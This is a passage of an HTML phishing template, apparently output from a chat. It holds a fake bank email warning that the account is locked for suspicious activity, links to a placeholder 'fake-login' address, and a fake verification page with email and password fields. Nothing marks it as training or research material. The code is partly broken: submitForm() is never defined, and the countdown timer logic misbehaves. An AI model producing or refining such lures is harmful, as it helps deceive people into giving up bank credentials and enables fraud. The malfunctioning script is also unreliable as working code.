            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .timer {
            font-size: 24px;
            font-weight: bold;
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <h2>Your Bank Account</h2>
        <p>Dear [Username],</p>
        <p>Your account has been temporarily locked due to suspicious activity. Click here to reset your password: 
            <a href="https://example.com/fake-login" style="color: #007bff">Reset Password</a></p>
        <p>For your security, please confirm your identity:</p>
        <a href="https://example.com/fake-login" class="button">Sign In</a>
        <p>If you did not request this email, please ignore it. Your account is safe.</p>
    </div>

    <div class="login-page">
        <h3>Account Verification Required</h3>
        <p>Please enter your account details to verify your identity:</p>
        <input type="email" id="email" placeholder="Enter your email address" required>
        <input type="password" id="password" placeholder="Enter your password" required>
        <div class="button" onclick="submitForm()">Sign In</div>
        <div class="timer">Time Elapsed: <span id="timer">00:00</span></div>
    </div>

    <script>
        function startTimer() {
            let timer = setInterval(() => {
                const time = document.getElementById('timer');
                let minutes = 3;
                let seconds = 0;

                function updateTimer() {
                    seconds += 1;
                    if (seconds === 60) {
                        minutes += 1;
                        seconds = 0;
                        document.getElementById('timer').textContent = `Time Elapsed: ${minutes}:${seconds.toString().padStart(2, '0')}`;
                    } else {
                        document.getElementById('timer').textContent = `Time Elapsed: ${minutes}:${seconds.toString().padStart(2, '0')}`;
                    }
                }
                updateTimer();
                if (seconds === 59) {
                    clearInterval(timer);
                    document.getElementById('timer').textContent = 'Time Elapsed: 00:00';
                }
            }, 1000);
        }

        window.onload = startTimer;
    </script>
</body>
</html>
```

